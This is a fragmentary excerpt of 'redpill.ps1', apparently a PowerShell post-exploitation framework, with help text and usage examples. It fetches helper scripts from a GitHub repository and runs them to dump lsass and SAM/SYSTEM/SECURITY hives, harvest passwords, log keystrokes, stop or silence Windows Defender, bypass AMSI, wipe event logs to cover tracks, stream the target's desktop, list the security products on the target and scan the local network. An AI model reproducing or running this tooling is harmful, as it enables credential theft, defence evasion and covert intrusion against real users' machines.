...
$ListParameters = @"
  ...
  -DumpLsass        lsass|all                Dump raw data from lsass/sam/system/security process/reg hives
...
If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
   ...
   If(-not(Test-Path -Path "$Env:TMP\GetLogs.ps1")){## Download GetLogs.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,7587890625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
...
$Timer = Get-Date -Format 'HH:mm:ss'
   ...
   If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1")){## Download Keylogger.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,3291015625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
...
If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
   ...
   If(-not(Test-Path -Path "$Env:TMP\GetPasswords.ps1")){## Download GetPasswords.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,47265625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
...
If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){
   ...
   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB) ## Default => 86,1044921875/KB
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 86 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
...
If($PingSweep -ieq "enum" -or $PingSweep -ieq "portscan")
{
   ...
   .Parameter Action
      Accepts arguments: query and PortScan (default: query)
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep -Enum
      Enumerate all active Ip addr on Lan

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep Enum -output verbose
      Enumerate all active addresses + verbose outputs

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep Enum -IpRange "65,72"
      Enum active addreses within the -IpRange 'int' sellected

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep PortScan -IpRange "1,255"
      Enum all addr + open ports (15 ports) + resolve Dns-NameHost!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep PortScan -ScanType bullet
      Enum all addr + open ports (8 ports) + resolve Dns-NameHost!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep PortScan -ScanType maxports -output verbose
      Enum all addr + open ports (25 ports) + resolve Dns-NameHost + verbose outputs!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep PortScan -iprange "192.168.1.72" -output verbose
   ...
   If(-not(Test-Path -Path "$Env:TMP\PingSweep.ps1"))
   {
      #Download PingSweep.ps1 from my GitHub repository
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1" -OutFile "$Env:TMP\PingSweep.ps1"|Out-Null 
   }

   #Setting Default values
   If(-not($output) -or $output -ieq $null){$output = "table"}
   If(-not($IpRange) -or $IpRange -ieq $null){$IpRange = "1,255"}
   If(-not($AddPort) -or $AddPort -ieq $null){$AddPort = "false"}
   If(-not($LogFile) -or $LogFile -ieq $null){$LogFile = "false"}
   If(-not($ScanType) -or $ScanType -ieq $null){$ScanType = "topports"}
   If(-not($TimeOut) -or $TimeOut -eq "5"){$TimeOut = "500"} #TTL ping.send(ip,timeout)

   #Run auxiliary module
   powershell -File "$Env:TMP\PingSweep.ps1" -Action $PingSweep -IpRange "$IpRange" -ScanType $ScanType -output $output -LogFile $LogFile -TimeOut $TimeOut
...
If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
   ...
   If($CleanTracks -ieq "Clear"){## Loop function {Sellected Range}
       powershell -File "$Env:TMP\CleanTracks.ps1" -CleanTracks Clear -Verb $Verb
   }ElseIf($CleanTracks -ieq "Paranoid"){
       powershell -File "$Env:TMP\CleanTracks.ps1" -CleanTracks Paranoid -Verb $Verb
   }
...
If($DisableAV -ne "false"){
   ...
   If(-not(Test-Path -Path "$Env:TMP\DisableDefender.ps1")){## Download DisableDefender.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,68359375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
   ...
   If($DisableAV -ieq "Query")
   {
      powershell -File "$Env:TMP\DisableDefender.ps1" -Action Query
   }
   ElseIf($DisableAV -ieq "Stop")
   {
      powershell -File "$Env:TMP\DisableDefender.ps1" -Action Stop -ServiceName "$ServiceName" -Delay "$Delay"
   }
   ElseIf($DisableAV -ieq "Start")
   {
      powershell -File "$Env:TMP\DisableDefender.ps1" -Action Start -ServiceName "$ServiceName" -Delay "$Delay"   
   }
   ElseIf($DisableAV -ieq "Silence")
   {
      powershell -File "$Env:TMP\DisableDefender.ps1" -Action Silence    
   }
   ElseIf($DisableAV -ieq "Revert")
   {
      powershell -File "$Env:TMP\DisableDefender.ps1" -Action Revert   
   }

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\SilenceDefender_ATP.ps1"){Remove-Item -Path "$Env:TMP\SilenceDefender_ATP.ps1" -Force}
}
...
If($LiveStream -ne "false"){
   ...
   If($LiveStream -ieq "Bind")
   {
      ...
      If(-not(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1")){## Download Stream-TargetDesktop.ps1 from my GitHub repository
...
If($GetCounterMeasures -ne "false"){
   ...
   If(-not(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1")){## Download GetCounterMeasures.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 75){## Corrupted download detected => DefaultFileSize: 75,1728515625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
   ...
   powershell -File "$Env:TMP\GetCounterMeasures.ps1" -Action "$GetCounterMeasures" -stringsearch "$stringsearch" -string "$string"
...
#>
   ...
   If(-not(Test-Path -Path "$Env:TMP\NoAmsi.ps1")){## Download NoAmsi.ps1 from my GitHub repository
      ...
      If($SizeDump -lt 43){## Corrupted download detected => DefaultFileSize: 43,0634765625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
   ...
   ElseIf($NoAmsi -ieq "Bypass")
   {
      ...
      Else
      {
         If($Id -eq "false"){$Id = "2"}
         ## &"<script>" allows me to run NoAmsi on redpill process
         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id -Appl $Appl
      }
   }
   Else
   {
...
If($DumpLsass -ne "false"){
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass lsass -FileName "DumpSecrets"
      Dump lsass data onto DumpSecrets.bin file

   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass lsass -Storage "$Env:TMP"
      Dump lsass data and all files required on %tmp% directory

   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass all -Storage "$Env:TMP"
   ...
   ## Download GetAdmin.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\DumpLsass.ps1"))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DumpLsass.ps1" -OutFile "$Env:TMP\DumpLsass.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\DumpLsass.ps1" -EA SilentlyContinue))
      {
         Write-Host "ERROR: fail to download $Env:TMP\DumpLsass.ps1!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n";exit #Exit @redpill
      }
   }
   ...
   ## Run auxiliary module
   Powershell -File "$Env:TMP\DumpLsass.ps1" -Action $DumpLsass
   Remove-Item -Path "$Env:TMP\DumpLsass.ps1" -Force
...
$HelpParameters = @"
   ...
   .Parameter Dicionary
      The dicionary to use abolucte path (default: `$Env:TMP\passwords.txt)
...
$HelpParameters = @"
   ...
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Cover tracks \ Clean artifacts {anti-forensic}
   ...
   .NOTES
      Required dependencies: cmd {native}, wevtutil {native}
      Administrator privileges are required to clean eventvwr and HKLM hive keys.
   ...
   .Parameter Verb
      Print onscreen outputs in verbose mode? (default: false)
   ...
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Paranoid -Verb True
...
"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PingSweep" -or $Help -ieq "IpRange"){
$HelpParameters = @"
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -PingSweep Enum -logfile True
   ...
   .OUTPUTS
      * Scanning local lan for active devices!
      ...
      ----  ------ --------- ------   ------- ------- -------
      Wi-Fi Up     65 Mbps   portscan 500(ms) 64,73   false
...
$HelpParameters = @"
   ...
   .DESCRIPTION
      This CmdLet Query, Stops, Start Anti-Virus Windows Defender
      service without the need to restart or refresh target machine.
      OR Silence microsoft defender from sending samples to the cloud
      by using firewall rules to Block the Defender connection!
   ...
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Silence
      Silence Microsoft defender from sending samples to the cloud.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Revert
...
$HelpParameters = @"
   ...
   .NOTES
      Invoking -GetCounterMeasures 'verbose' triggers cmdlet to hunt security processes running,
      AppWhitelisting, Behavioral Analysis, Intrusion Detection, Firewall, WDefender preferences,
      DEP, DLP, HIPS and Hunt for EDR's by driver name. ( accurate\recomended, but slower scan )
      ...
      description. ( fast scan \ less accurate that -GetCounterMeasures 'verbose' param scans )

   .Parameter GetCounterMeasures
      Accepts arguments: Enum, Verbose (default: Enum)
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetCounterMeasures Enum
      List common security product processes\pid's running on target!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetCounterMeasures Verbose
      List common security product processes names\pid's, AppWhitelisting,
      Behavioral Analysis, EDR, DLP, Intrusion Detection, Firewall, HIPS.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetCounterMeasures Verbose -stringsearch 'true'
      Search for strings 'Defender|antimalware' on drivers File Description

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetCounterMeasures 'enum' -stringsearch 'true' -string 'Defender'
      Search for string 'Defender' on drivers File Description
...
$HelpParameters = @"
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 6 -Appl "%windir%\regedit.exe"
...
$HelpParameters = @"
   ...
   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass lsass
      Dump lsass data onto MiniDump.bin file

   .EXAMPLE
      PS C:\> .\redpill.ps1 -DumpLsass all
      Dump lsass + sam + system + securty data
...
$HelpParameters = @"
   ...
   .Parameter PingTimeOut
      accepts values from '200' to '2000' ms (default: 400)
